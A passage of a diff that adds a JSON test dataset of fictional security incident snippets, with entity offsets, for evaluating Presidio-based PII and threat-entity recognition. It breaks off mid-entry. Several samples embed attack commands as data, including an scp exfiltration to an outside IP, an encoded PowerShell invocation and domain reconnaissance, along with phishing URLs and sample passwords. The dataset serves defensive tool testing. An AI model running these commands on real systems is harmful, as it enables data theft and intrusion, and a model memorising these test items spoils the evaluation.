@@ -1,0 +1,4121 @@
+{
+  "description": "Dataset di valutazione per Analyzer/Anonymizer Presidio - orientato a cybersecurity e rapporti incidenti",
+  "version": "2.0",
+  "language": "en",
+  "notes": {
+    "standard_entities": "PERSON, EMAIL_ADDRESS, PHONE_NUMBER, IP_ADDRESS, URL, DATE_TIME, LOCATION, ORGANIZATION, CREDIT_CARD, US_SSN, IBAN_CODE, CRYPTO - rilevati dai recognizer standard Presidio",
+    "custom_entities": "INCIDENT_ID, MALWARE, RANSOMWARE, INTERNAL_SERVER, THREAT_ACTOR, THREAT_GROUP, VULNERABILITY, CVE, CWE, HASH_FILE, USERNAME, PASSWORD, PORT_NUMBER, PROTOCOL, PROCESS_NAME, COMMAND, MITRE_TECHNIQUE - CVE da CVERecognizer, CWE da CWERecognizer, altri da langextract",
+    "offset_convention": "start incluso, end escluso (Python slice): text[start:end] == entity_text"
+  },
+  "test_cases": [
+    {
+      "id": "cyber_001",
+      "description": "Rapporto incidente ransomware - multipli tipi entità",
+      "text": "Incident INC-2025-0042: On 2025-03-15 LockBit 3.0 ransomware hit server SRV-DC01. Analyst John Miller found hash a1b2c3d4e5f6. Source IP 203.0.113.42 targeted 10.0.1.50 on port 445.",
+      "ground_truth": [
+        {
+          "start": 9,
+          "end": 22,
+          "entity_type": "INCIDENT_ID",
+          "text": "INC-2025-0042"
+        },
+        {
+          "start": 27,
+          "end": 37,
+          "entity_type": "DATE_TIME",
+          "text": "2025-03-15"
+        },
+        {
+          "start": 38,
+          "end": 49,
+          "entity_type": "RANSOMWARE",
+          "text": "LockBit 3.0"
+        },
+        {
+          "start": 72,
+          "end": 80,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "SRV-DC01"
+        },
+        {
+          "start": 90,
+          "end": 101,
+          "entity_type": "PERSON",
+          "text": "John Miller"
+        },
+        {
+          "start": 113,
+          "end": 125,
+          "entity_type": "HASH_FILE",
+          "text": "a1b2c3d4e5f6"
+        },
+        {
+          "start": 137,
+          "end": 149,
+          "entity_type": "IP_ADDRESS",
+          "text": "203.0.113.42"
+        },
+        {
+          "start": 159,
+          "end": 168,
+          "entity_type": "IP_ADDRESS",
+          "text": "10.0.1.50"
+        },
+        {
+          "start": 177,
+          "end": 180,
+          "entity_type": "PORT_NUMBER",
+          "text": "445"
+        }
+      ]
+    },
+    {
+      "id": "cyber_002",
+      "description": "Campagna di phishing con email, URL e attribuzione",
+      "text": "Phishing alert: user jsmith@acme.com got email from phish@evil.net linking to https://acme-login.evil.net/creds. Reported by Jane Smith on 2025-02-20.",
+      "ground_truth": [
+        {
+          "start": 21,
+          "end": 36,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "jsmith@acme.com"
+        },
+        {
+          "start": 52,
+          "end": 66,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "phish@evil.net"
+        },
+        {
+          "start": 78,
+          "end": 111,
+          "entity_type": "URL",
+          "text": "https://acme-login.evil.net/creds"
+        },
+        {
+          "start": 125,
+          "end": 135,
+          "entity_type": "PERSON",
+          "text": "Jane Smith"
+        },
+        {
+          "start": 139,
+          "end": 149,
+          "entity_type": "DATE_TIME",
+          "text": "2025-02-20"
+        }
+      ]
+    },
+    {
+      "id": "cyber_003",
+      "description": "Attribuzione APT con CVE e tecnica MITRE ATT&CK",
+      "text": "APT28 exploited CVE-2024-1234 using technique T1566.001 to compromise Acme Corp networks in Washington DC on 2025-01-10.",
+      "ground_truth": [
+        {
+          "start": 0,
+          "end": 5,
+          "entity_type": "THREAT_GROUP",
+          "text": "APT28"
+        },
+        {
+          "start": 16,
+          "end": 29,
+          "entity_type": "CVE",
+          "text": "CVE-2024-1234"
+        },
+        {
+          "start": 46,
+          "end": 55,
+          "entity_type": "MITRE_TECHNIQUE",
+          "text": "T1566.001"
+        },
+        {
+          "start": 70,
+          "end": 79,
+          "entity_type": "ORGANIZATION",
+          "text": "Acme Corp"
+        },
+        {
+          "start": 92,
+          "end": 105,
+          "entity_type": "LOCATION",
+          "text": "Washington DC"
+        },
+        {
+          "start": 109,
+          "end": 119,
+          "entity_type": "DATE_TIME",
+          "text": "2025-01-10"
+        }
+      ]
+    },
+    {
+      "id": "cyber_004",
+      "description": "Compromissione credenziali - brute force SSH",
+      "text": "Brute-force on SSH port 22: user admin gained access to FILESVR-03 from 185.220.101.5. Password P@ssw0rd! was found in logs on 2025-03-01.",
+      "ground_truth": [
+        {
+          "start": 15,
+          "end": 18,
+          "entity_type": "PROTOCOL",
+          "text": "SSH"
+        },
+        {
+          "start": 24,
+          "end": 26,
+          "entity_type": "PORT_NUMBER",
+          "text": "22"
+        },
+        {
+          "start": 33,
+          "end": 38,
+          "entity_type": "USERNAME",
+          "text": "admin"
+        },
+        {
+          "start": 56,
+          "end": 66,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "FILESVR-03"
+        },
+        {
+          "start": 72,
+          "end": 85,
+          "entity_type": "IP_ADDRESS",
+          "text": "185.220.101.5"
+        },
+        {
+          "start": 96,
+          "end": 105,
+          "entity_type": "PASSWORD",
+          "text": "P@ssw0rd!"
+        },
+        {
+          "start": 127,
+          "end": 137,
+          "entity_type": "DATE_TIME",
+          "text": "2025-03-01"
+        }
+      ]
+    },
+    {
+      "id": "cyber_005",
+      "description": "Analisi malware con hash, processo e C2",
+      "text": "Malware Emotet dropper uses process svchost.exe and runs cmd /c whoami. C2 server at https://c2.malware.xyz/beacon. MD5: d41d8cd98f00b204e9800998ecf8427e.",
+      "ground_truth": [
+        {
+          "start": 8,
+          "end": 14,
+          "entity_type": "MALWARE",
+          "text": "Emotet"
+        },
+        {
+          "start": 36,
+          "end": 47,
+          "entity_type": "PROCESS_NAME",
+          "text": "svchost.exe"
+        },
+        {
+          "start": 57,
+          "end": 70,
+          "entity_type": "COMMAND",
+          "text": "cmd /c whoami"
+        },
+        {
+          "start": 85,
+          "end": 114,
+          "entity_type": "URL",
+          "text": "https://c2.malware.xyz/beacon"
+        },
+        {
+          "start": 121,
+          "end": 153,
+          "entity_type": "HASH_FILE",
+          "text": "d41d8cd98f00b204e9800998ecf8427e"
+        }
+      ]
+    },
+    {
+      "id": "cyber_006",
+      "description": "Intrusione di rete - IDS alert con IP, porte, processi",
+      "text": "IDS alert: TCP connection from 45.33.32.156 to 192.168.10.5 on port 8080. Process nc.exe detected running powershell -enc ZW5jb2RlZA== on host WEB-PROD-01.",
+      "ground_truth": [
+        {
+          "start": 11,
+          "end": 14,
+          "entity_type": "PROTOCOL",
+          "text": "TCP"
+        },
+        {
+          "start": 31,
+          "end": 43,
+          "entity_type": "IP_ADDRESS",
+          "text": "45.33.32.156"
+        },
+        {
+          "start": 47,
+          "end": 59,
+          "entity_type": "IP_ADDRESS",
+          "text": "192.168.10.5"
+        },
+        {
+          "start": 68,
+          "end": 72,
+          "entity_type": "PORT_NUMBER",
+          "text": "8080"
+        },
+        {
+          "start": 82,
+          "end": 88,
+          "entity_type": "PROCESS_NAME",
+          "text": "nc.exe"
+        },
+        {
+          "start": 106,
+          "end": 134,
+          "entity_type": "COMMAND",
+          "text": "powershell -enc ZW5jb2RlZA=="
+        },
+        {
+          "start": 143,
+          "end": 154,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "WEB-PROD-01"
+        }
+      ]
+    },
+    {
+      "id": "cyber_007",
+      "description": "Disclosure vulnerabilità con patch e URL advisory",
+      "text": "Microsoft disclosed CVE-2025-21234 affecting Exchange Server. Patch released 2025-03-11 at https://portal.msrc.microsoft.com/patch.",
+      "ground_truth": [
+        {
+          "start": 0,
+          "end": 9,
+          "entity_type": "ORGANIZATION",
+          "text": "Microsoft"
+        },
+        {
+          "start": 20,
+          "end": 34,
+          "entity_type": "CVE",
+          "text": "CVE-2025-21234"
+        },
+        {
+          "start": 77,
+          "end": 87,
+          "entity_type": "DATE_TIME",
+          "text": "2025-03-11"
+        },
+        {
+          "start": 91,
+          "end": 130,
+          "entity_type": "URL",
+          "text": "https://portal.msrc.microsoft.com/patch"
+        }
+      ]
+    },
+    {
+      "id": "cyber_008",
+      "description": "Esfiltrazione dati - username, server, comando, persona",
+      "text": "User mwilson exfiltrated 2.3GB from DB-MASTER-01 to 89.248.172.16. Command used: scp -r /data user@89.248.172.16:/tmp. Incident logged by Mark Wilson.",
+      "ground_truth": [
+        {
+          "start": 5,
+          "end": 12,
+          "entity_type": "USERNAME",
+          "text": "mwilson"
+        },
+        {
+          "start": 36,
+          "end": 48,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "DB-MASTER-01"
+        },
+        {
+          "start": 52,
+          "end": 65,
+          "entity_type": "IP_ADDRESS",
+          "text": "89.248.172.16"
+        },
+        {
+          "start": 81,
+          "end": 117,
+          "entity_type": "COMMAND",
+          "text": "scp -r /data user@89.248.172.16:/tmp"
+        },
+        {
+          "start": 138,
+          "end": 149,
+          "entity_type": "PERSON",
+          "text": "Mark Wilson"
+        }
+      ]
+    },
+    {
+      "id": "cyber_009",
+      "description": "Attacco DDoS - multipli IP sorgente e porte",
+      "text": "DDoS targeting GlobalBank on 2025-03-10 from botnet IPs including 198.51.100.1 and 203.0.113.50. Peak traffic on port 80 and 443.",
+      "ground_truth": [
+        {
+          "start": 15,
+          "end": 25,
+          "entity_type": "ORGANIZATION",
+          "text": "GlobalBank"
+        },
+        {
+          "start": 29,
+          "end": 39,
+          "entity_type": "DATE_TIME",
+          "text": "2025-03-10"
+        },
+        {
+          "start": 66,
+          "end": 78,
+          "entity_type": "IP_ADDRESS",
+          "text": "198.51.100.1"
+        },
+        {
+          "start": 83,
+          "end": 95,
+          "entity_type": "IP_ADDRESS",
+          "text": "203.0.113.50"
+        },
+        {
+          "start": 118,
+          "end": 120,
+          "entity_type": "PORT_NUMBER",
+          "text": "80"
+        },
+        {
+          "start": 125,
+          "end": 128,
+          "entity_type": "PORT_NUMBER",
+          "text": "443"
+        }
+      ]
+    },
+    {
+      "id": "cyber_010",
+      "description": "Rapporto CSIRT in italiano - phishing e server compromesso",
+      "text": "Rapporto CSIRT: L'utente marco.verdi ha ricevuto phishing da attacker@darkweb.onion il 2025-03-12. Server compromesso: APP-SRV-IT02 con IP 10.20.30.40. Responsabile: Dott. Marco Verdi.",
+      "ground_truth": [
+        {
+          "start": 25,
+          "end": 36,
+          "entity_type": "USERNAME",
+          "text": "marco.verdi"
+        },
+        {
+          "start": 61,
+          "end": 83,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "attacker@darkweb.onion"
+        },
+        {
+          "start": 87,
+          "end": 97,
+          "entity_type": "DATE_TIME",
+          "text": "2025-03-12"
+        },
+        {
+          "start": 119,
+          "end": 131,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "APP-SRV-IT02"
+        },
+        {
+          "start": 139,
+          "end": 150,
+          "entity_type": "IP_ADDRESS",
+          "text": "10.20.30.40"
+        },
+        {
+          "start": 166,
+          "end": 183,
+          "entity_type": "PERSON",
+          "text": "Dott. Marco Verdi"
+        }
+      ]
+    },
+    {
+      "id": "cyber_011",
+      "description": "Incidente complesso - threat actor, malware, CVE, MITRE, contatti",
+      "text": "TLP:RED - Ticket SOC-2025-1337: Threat actor Lazarus Group used Cobalt Strike via CVE-2024-5678 and T1059.001 on 2025-03-14. Contact: soc-lead@cert.gov.it, phone +1-202-555-0147.",
+      "ground_truth": [
+        {
+          "start": 17,
+          "end": 30,
+          "entity_type": "INCIDENT_ID",
+          "text": "SOC-2025-1337"
+        },
+        {
+          "start": 45,
+          "end": 58,
+          "entity_type": "THREAT_GROUP",
+          "text": "Lazarus Group"
+        },
+        {
+          "start": 64,
+          "end": 77,
+          "entity_type": "MALWARE",
+          "text": "Cobalt Strike"
+        },
+        {
+          "start": 82,
+          "end": 95,
+          "entity_type": "CVE",
+          "text": "CVE-2024-5678"
+        },
+        {
+          "start": 100,
+          "end": 109,
+          "entity_type": "MITRE_TECHNIQUE",
+          "text": "T1059.001"
+        },
+        {
+          "start": 113,
+          "end": 123,
+          "entity_type": "DATE_TIME",
+          "text": "2025-03-14"
+        },
+        {
+          "start": 134,
+          "end": 154,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "soc-lead@cert.gov.it"
+        },
+        {
+          "start": 162,
+          "end": 177,
+          "entity_type": "PHONE_NUMBER",
+          "text": "+1-202-555-0147"
+        }
+      ]
+    },
+    {
+      "id": "cyber_012",
+      "description": "Testo tecnico senza PII - controllo falsi positivi",
+      "text": "The SIEM processed 1.2 million events. Alert severity: high. Rule ID: 5001. CVSS score: 9.8.",
+      "ground_truth": []
+    },
+    {
+      "id": "cyber_013",
+      "description": "Insider threat - dipendente, username, server, comando",
+      "text": "Insider threat: employee Robert Chen (username rchen) accessed HR-FILESVR at 23:45 on 2025-03-08 and ran net user /domain. Contact HR at hr-security@acme.com.",
+      "ground_truth": [
+        {
+          "start": 25,
+          "end": 36,
+          "entity_type": "PERSON",
+          "text": "Robert Chen"
+        },
+        {
+          "start": 47,
+          "end": 52,
+          "entity_type": "USERNAME",
+          "text": "rchen"
+        },
+        {
+          "start": 63,
+          "end": 73,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "HR-FILESVR"
+        },
+        {
+          "start": 77,
+          "end": 82,
+          "entity_type": "DATE_TIME",
+          "text": "23:45"
+        },
+        {
+          "start": 86,
+          "end": 96,
+          "entity_type": "DATE_TIME",
+          "text": "2025-03-08"
+        },
+        {
+          "start": 105,
+          "end": 121,
+          "entity_type": "COMMAND",
+          "text": "net user /domain"
+        },
+        {
+          "start": 137,
+          "end": 157,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "hr-security@acme.com"
+        }
+      ]
+    },
+    {
+      "id": "cyber_014",
+      "description": "Attacco supply chain - threat actor, hash, CVE",
+      "text": "Supply chain attack via compromised npm package lodash-utils published by ShadowBrokers. Hash: e99a18c428cb38d5f260853678922e03. Exploits CVE-2025-9999 in NodeJS apps.",
+      "ground_truth": [
+        {
+          "start": 74,
+          "end": 87,
+          "entity_type": "THREAT_ACTOR",
+          "text": "ShadowBrokers"
+        },
+        {
+          "start": 95,
+          "end": 127,
+          "entity_type": "HASH_FILE",
+          "text": "e99a18c428cb38d5f260853678922e03"
+        },
+        {
+          "start": 138,
+          "end": 151,
+          "entity_type": "CVE",
+          "text": "CVE-2025-9999"
+        }
+      ]
+    },
+    {
+      "id": "cyber_015",
+      "description": "Log analysis - scan di rete con multipli IP, porte, protocolli e timestamp ISO",
+      "text": "Scan detected from 172.16.0.100 to 10.0.0.1 on ports 22, 80, 443 and 3389. Protocol SSH and RDP. Timestamp: 2025-03-15T08:30:00Z.",
+      "ground_truth": [
+        {
+          "start": 19,
+          "end": 31,
+          "entity_type": "IP_ADDRESS",
+          "text": "172.16.0.100"
+        },
+        {
+          "start": 35,
+          "end": 43,
+          "entity_type": "IP_ADDRESS",
+          "text": "10.0.0.1"
+        },
+        {
+          "start": 53,
+          "end": 55,
+          "entity_type": "PORT_NUMBER",
+          "text": "22"
+        },
+        {
+          "start": 57,
+          "end": 59,
+          "entity_type": "PORT_NUMBER",
+          "text": "80"
+        },
+        {
+          "start": 61,
+          "end": 64,
+          "entity_type": "PORT_NUMBER",
+          "text": "443"
+        },
+        {
+          "start": 69,
+          "end": 73,
+          "entity_type": "PORT_NUMBER",
+          "text": "3389"
+        },
+        {
+          "start": 84,
+          "end": 87,
+          "entity_type": "PROTOCOL",
+          "text": "SSH"
+        },
+        {
+          "start": 92,
+          "end": 95,
+          "entity_type": "PROTOCOL",
+          "text": "RDP"
+        },
+        {
+          "start": 108,
+          "end": 128,
+          "entity_type": "DATE_TIME",
+          "text": "2025-03-15T08:30:00Z"
+        }
+      ]
+    },
+    {
+      "id": "cyber_016",
+      "description": "Vulnerability assessment - CWE (XSS, SQL injection), persona e data",
+      "text": "Penetration test found CWE-79 (XSS) and CWE-89 (SQL injection) in web app. Report by Alice Brown on 2025-03-16.",
+      "ground_truth": [
+        {
+          "start": 23,
+          "end": 29,
+          "entity_type": "CWE",
+          "text": "CWE-79"
+        },
+        {
+          "start": 40,
+          "end": 46,
+          "entity_type": "CWE",
+          "text": "CWE-89"
+        },
+        {
+          "start": 85,
+          "end": 96,
+          "entity_type": "PERSON",
+          "text": "Alice Brown"
+        },
+        {
+          "start": 100,
+          "end": 110,
+          "entity_type": "DATE_TIME",
+          "text": "2025-03-16"
+        }
+      ]
+    },
+    {
+      "id": "cyber_017",
+      "description": "EN narrative - ransomware with spelled-out dates and port numbers",
+      "text": "During our weekly security review on the fifteenth of March two thousand twenty-five, senior analyst Sarah Thompson discovered that the internal mail gateway MAIL-GW-01 had been compromised. The threat group known as Fancy Bear exploited CVE-2025-3456 to gain access through port four hundred forty-three. Outbound connections were traced to 198.51.100.77.",
+      "ground_truth": [
+        {
+          "start": 37,
+          "end": 84,
+          "entity_type": "DATE_TIME",
+          "text": "the fifteenth of March two thousand twenty-five"
+        },
+        {
+          "start": 101,
+          "end": 115,
+          "entity_type": "PERSON",
+          "text": "Sarah Thompson"
+        },
+        {
+          "start": 158,
+          "end": 168,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "MAIL-GW-01"
+        },
+        {
+          "start": 217,
+          "end": 227,
+          "entity_type": "THREAT_GROUP",
+          "text": "Fancy Bear"
+        },
+        {
+          "start": 238,
+          "end": 251,
+          "entity_type": "CVE",
+          "text": "CVE-2025-3456"
+        },
+        {
+          "start": 280,
+          "end": 304,
+          "entity_type": "PORT_NUMBER",
+          "text": "four hundred forty-three"
+        },
+        {
+          "start": 342,
+          "end": 355,
+          "entity_type": "IP_ADDRESS",
+          "text": "198.51.100.77"
+        }
+      ]
+    },
+    {
+      "id": "cyber_018",
+      "description": "EN informal phishing narrative with company name and multiple contacts",
+      "text": "I wanted to flag an unusual phishing campaign we noticed yesterday. A colleague named David Park received a suspicious email from noreply@secure-banking.xyz with a link to https://secure-banking.xyz/verify. The weird thing is, the email looked completely legitimate and even mentioned our company TechVault Inc by name. David reported it to soc@techvault.com around three thirty in the afternoon on March twelfth.",
+      "ground_truth": [
+        {
+          "start": 86,
+          "end": 96,
+          "entity_type": "PERSON",
+          "text": "David Park"
+        },
+        {
+          "start": 130,
+          "end": 156,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "noreply@secure-banking.xyz"
+        },
+        {
+          "start": 172,
+          "end": 205,
+          "entity_type": "URL",
+          "text": "https://secure-banking.xyz/verify"
+        },
+        {
+          "start": 297,
+          "end": 310,
+          "entity_type": "ORGANIZATION",
+          "text": "TechVault Inc"
+        },
+        {
+          "start": 341,
+          "end": 358,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "soc@techvault.com"
+        },
+        {
+          "start": 366,
+          "end": 412,
+          "entity_type": "DATE_TIME",
+          "text": "three thirty in the afternoon on March twelfth"
+        }
+      ]
+    },
+    {
+      "id": "cyber_019",
+      "description": "EN APT narrative with MITRE technique, spelled-out port and protocol",
+      "text": "So we have been tracking this APT group called Cozy Bear for about six months now, and they have gotten really sophisticated. Last Tuesday, on the eleventh of March twenty twenty-five, they deployed a modified version of Mimikatz on our domain controller DC-ADMIN-05. The initial vector was a spear-phishing email to admin.jones@corporate.net, and they used technique T1078.002 for privilege escalation. What really worries me is that they exfiltrated data to 203.0.113.99 over port eight thousand four hundred forty-three using HTTPS.",
+      "ground_truth": [
+        {
+          "start": 47,
+          "end": 56,
+          "entity_type": "THREAT_GROUP",
+          "text": "Cozy Bear"
+        },
+        {
+          "start": 143,
+          "end": 183,
+          "entity_type": "DATE_TIME",
+          "text": "the eleventh of March twenty twenty-five"
+        },
+        {
+          "start": 221,
+          "end": 229,
+          "entity_type": "MALWARE",
+          "text": "Mimikatz"
+        },
+        {
+          "start": 255,
+          "end": 266,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "DC-ADMIN-05"
+        },
+        {
+          "start": 317,
+          "end": 342,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "admin.jones@corporate.net"
+        },
+        {
+          "start": 368,
+          "end": 377,
+          "entity_type": "MITRE_TECHNIQUE",
+          "text": "T1078.002"
+        },
+        {
+          "start": 460,
+          "end": 472,
+          "entity_type": "IP_ADDRESS",
+          "text": "203.0.113.99"
+        },
+        {
+          "start": 483,
+          "end": 522,
+          "entity_type": "PORT_NUMBER",
+          "text": "eight thousand four hundred forty-three"
+        },
+        {
+          "start": 529,
+          "end": 534,
+          "entity_type": "PROTOCOL",
+          "text": "HTTPS"
+        }
+      ]
+    },
+    {
+      "id": "cyber_020",
+      "description": "EN incident update with password, hash, username and spelled-out time",
+      "text": "Incident INC-2025-0512 update: The investigation into the breach at Meridian Healthcare has taken an unexpected turn. Forensic analyst Dr. Emily Watson found that the attacker used the username sysadm1n to log into JUMP-SRV-03 at approximately twenty-two fifteen on the night of the seventh of March. The password cracked was Welcome2025! and the session originated from 185.100.87.202. We also recovered a SHA1 hash from the dropped payload: 7b52009b64fd0a2a49e6d8a939753077792b0554.",
+      "ground_truth": [
+        {
+          "start": 9,
+          "end": 22,
+          "entity_type": "INCIDENT_ID",
+          "text": "INC-2025-0512"
+        },
+        {
+          "start": 68,
+          "end": 87,
+          "entity_type": "ORGANIZATION",
+          "text": "Meridian Healthcare"
+        },
+        {
+          "start": 135,
+          "end": 151,
+          "entity_type": "PERSON",
+          "text": "Dr. Emily Watson"
+        },
+        {
+          "start": 194,
+          "end": 202,
+          "entity_type": "USERNAME",
+          "text": "sysadm1n"
+        },
+        {
+          "start": 215,
+          "end": 226,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "JUMP-SRV-03"
+        },
+        {
+          "start": 244,
+          "end": 299,
+          "entity_type": "DATE_TIME",
+          "text": "twenty-two fifteen on the night of the seventh of March"
+        },
+        {
+          "start": 326,
+          "end": 338,
+          "entity_type": "PASSWORD",
+          "text": "Welcome2025!"
+        },
+        {
+          "start": 371,
+          "end": 385,
+          "entity_type": "IP_ADDRESS",
+          "text": "185.100.87.202"
+        },
+        {
+          "start": 443,
+          "end": 483,
+          "entity_type": "HASH_FILE",
+          "text": "7b52009b64fd0a2a49e6d8a939753077792b0554"
+        }
+      ]
+    },
+    {
+      "id": "cyber_021",
+      "description": "EN malware reverse engineering report with CWE, processes, spelled-out port",
+      "text": "The malware reverse engineering report is finally complete. The sample, identified as a TrickBot variant, creates a process called winlogon_update.exe that phones home to https://updates.legit-windows.com/check every thirty minutes. It drops a secondary payload with SHA1 hash abc123def456789012345678abcdef01abcdef99 and injects into explorer.exe. The vulnerability exploited is classified as CWE-416, a use-after-free, and it communicates via TCP on port four thousand four hundred forty-four.",
+      "ground_truth": [
+        {
+          "start": 88,
+          "end": 96,
+          "entity_type": "MALWARE",
+          "text": "TrickBot"
+        },
+        {
+          "start": 131,
+          "end": 150,
+          "entity_type": "PROCESS_NAME",
+          "text": "winlogon_update.exe"
+        },
+        {
+          "start": 171,
+          "end": 210,
+          "entity_type": "URL",
+          "text": "https://updates.legit-windows.com/check"
+        },
+        {
+          "start": 277,
+          "end": 317,
+          "entity_type": "HASH_FILE",
+          "text": "abc123def456789012345678abcdef01abcdef99"
+        },
+        {
+          "start": 335,
+          "end": 347,
+          "entity_type": "PROCESS_NAME",
+          "text": "explorer.exe"
+        },
+        {
+          "start": 394,
+          "end": 401,
+          "entity_type": "CWE",
+          "text": "CWE-416"
+        },
+        {
+          "start": 445,
+          "end": 448,
+          "entity_type": "PROTOCOL",
+          "text": "TCP"
+        },
+        {
+          "start": 457,
+          "end": 494,
+          "entity_type": "PORT_NUMBER",
+          "text": "four thousand four hundred forty-four"
+        }
+      ]
+    },
+    {
+      "id": "cyber_022",
+      "description": "EN insider threat with credit card, command, spelled-out date and time",
+      "text": "This is probably the strangest insider threat case our team has encountered. On the twenty-eighth of February, around a quarter past eleven at night, we discovered that our colleague Michael O'Brien, username mobrien, had been accessing the finance database server FIN-DB-PRIMARY without authorization. He executed the command sqlcmd -S FIN-DB-PRIMARY -Q SELECT * FROM salaries to extract salary data and sent it to his personal email m.obrien.personal@gmail.com. Among the exposed data were credit card numbers like 4532015123456789.",
+      "ground_truth": [
+        {
+          "start": 80,
+          "end": 109,
+          "entity_type": "DATE_TIME",
+          "text": "the twenty-eighth of February"
+        },
+        {
+          "start": 118,
+          "end": 148,
+          "entity_type": "DATE_TIME",
+          "text": "a quarter past eleven at night"
+        },
+        {
+          "start": 183,
+          "end": 198,
+          "entity_type": "PERSON",
+          "text": "Michael O'Brien"
+        },
+        {
+          "start": 209,
+          "end": 216,
+          "entity_type": "USERNAME",
+          "text": "mobrien"
+        },
+        {
+          "start": 265,
+          "end": 279,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "FIN-DB-PRIMARY"
+        },
+        {
+          "start": 327,
+          "end": 377,
+          "entity_type": "COMMAND",
+          "text": "sqlcmd -S FIN-DB-PRIMARY -Q SELECT * FROM salaries"
+        },
+        {
+          "start": 435,
+          "end": 462,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "m.obrien.personal@gmail.com"
+        },
+        {
+          "start": 517,
+          "end": 533,
+          "entity_type": "CREDIT_CARD",
+          "text": "4532015123456789"
+        }
+      ]
+    },
+    {
+      "id": "cyber_023",
+      "description": "EN DDoS narrative with spelled-out ports and botnet IPs",
+      "text": "We have been dealing with a pretty nasty DDoS attack against our main website since early this morning. The attack started at roughly six forty-five AM on the sixteenth of March and has been sustained for over twelve hours. Our SOC team, led by Jennifer Walsh, identified the botnet source IPs including 198.51.100.200 and 203.0.113.150. The attack is targeting ports eighty and four hundred forty-three with a mix of SYN flood and HTTP GET requests. The SIEM ticket is SEC-2025-0891.",
+      "ground_truth": [
+        {
+          "start": 134,
+          "end": 177,
+          "entity_type": "DATE_TIME",
+          "text": "six forty-five AM on the sixteenth of March"
+        },
+        {
+          "start": 245,
+          "end": 259,
+          "entity_type": "PERSON",
+          "text": "Jennifer Walsh"
+        },
+        {
+          "start": 304,
+          "end": 318,
+          "entity_type": "IP_ADDRESS",
+          "text": "198.51.100.200"
+        },
+        {
+          "start": 323,
+          "end": 336,
+          "entity_type": "IP_ADDRESS",
+          "text": "203.0.113.150"
+        },
+        {
+          "start": 368,
+          "end": 374,
+          "entity_type": "PORT_NUMBER",
+          "text": "eighty"
+        },
+        {
+          "start": 379,
+          "end": 403,
+          "entity_type": "PORT_NUMBER",
+          "text": "four hundred forty-three"
+        },
+        {
+          "start": 432,
+          "end": 436,
+          "entity_type": "PROTOCOL",
+          "text": "HTTP"
+        },
+        {
+          "start": 470,
+          "end": 483,
+          "entity_type": "INCIDENT_ID",
+          "text": "SEC-2025-0891"
+        }
+      ]
+    },
+    {
+      "id": "cyber_024",
+      "description": "EN vulnerability assessment with multiple CWE/CVE, phone and email",
+      "text": "The vulnerability assessment conducted by our external pen-tester Robert Kim on the third of March revealed several critical findings. The web application hosted on WEB-FRONT-02 is susceptible to CWE-89 SQL injection and CWE-79 cross-site scripting. Moreover, the underlying Apache server is running an outdated version vulnerable to CVE-2025-22134 and CVE-2024-50387. Robert recommends immediate patching and has documented everything at https://pentest-portal.secureco.io/report/2025-Q1. For questions, reach out to rkim@secureco.io or call +44-20-7946-0958.",
+      "ground_truth": [
+        {
+          "start": 66,
+          "end": 76,
+          "entity_type": "PERSON",
+          "text": "Robert Kim"
+        },
+        {
+          "start": 80,
+          "end": 98,
+          "entity_type": "DATE_TIME",
+          "text": "the third of March"
+        },
+        {
+          "start": 165,
+          "end": 177,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "WEB-FRONT-02"
+        },
+        {
+          "start": 196,
+          "end": 202,
+          "entity_type": "CWE",
+          "text": "CWE-89"
+        },
+        {
+          "start": 221,
+          "end": 227,
+          "entity_type": "CWE",
+          "text": "CWE-79"
+        },
+        {
+          "start": 334,
+          "end": 348,
+          "entity_type": "CVE",
+          "text": "CVE-2025-22134"
+        },
+        {
+          "start": 353,
+          "end": 367,
+          "entity_type": "CVE",
+          "text": "CVE-2024-50387"
+        },
+        {
+          "start": 439,
+          "end": 488,
+          "entity_type": "URL",
+          "text": "https://pentest-portal.secureco.io/report/2025-Q1"
+        },
+        {
+          "start": 518,
+          "end": 534,
+          "entity_type": "EMAIL_ADDRESS",
+          "text": "rkim@secureco.io"
+        },
+        {
+          "start": 543,
+          "end": 559,
+          "entity_type": "PHONE_NUMBER",
+          "text": "+44-20-7946-0958"
+        }
+      ]
+    },
+    {
+      "id": "cyber_025",
+      "description": "EN ransomware narrative with SHA256, two servers, spelled-out port",
+      "text": "I need to document something that happened at approximately twenty minutes past three on the afternoon of March ninth, two thousand twenty-five. An automated scan on our network picked up a new strain of ransomware that our threat intel team is calling DarkVault. The malware was found on servers EXCHANGE-SRV-01 and BACKUP-NAS-07, encrypting files with the extension .dvault. The initial infection vector appears to be CVE-2025-0001, a critical zero-day in the VPN appliance. The ransomware connects to 185.220.101.44 on port nine thousand nine hundred ninety-nine via TCP for key exchange. The associated SHA256 hash is e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.",
+      "ground_truth": [
+        {
+          "start": 60,
+          "end": 143,
+          "entity_type": "DATE_TIME",
+          "text": "twenty minutes past three on the afternoon of March ninth, two thousand twenty-five"
+        },
+        {
+          "start": 253,
+          "end": 262,
+          "entity_type": "RANSOMWARE",
+          "text": "DarkVault"
+        },
+        {
+          "start": 297,
+          "end": 312,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "EXCHANGE-SRV-01"
+        },
+        {
+          "start": 317,
+          "end": 330,
+          "entity_type": "INTERNAL_SERVER",
+          "text": "BACKUP-NAS-07"
+        },
+        {
+          "start": 420,
+          "end": 433,
+          "entity_type": "CVE",
+          "text": "CVE-2025-0001"
+        },
+        {
+          "start": 504,
+          "end": 518,
+          "entity_type": "IP_ADDRESS",
+          "text": "185.220.101.44"
+        },
+        {
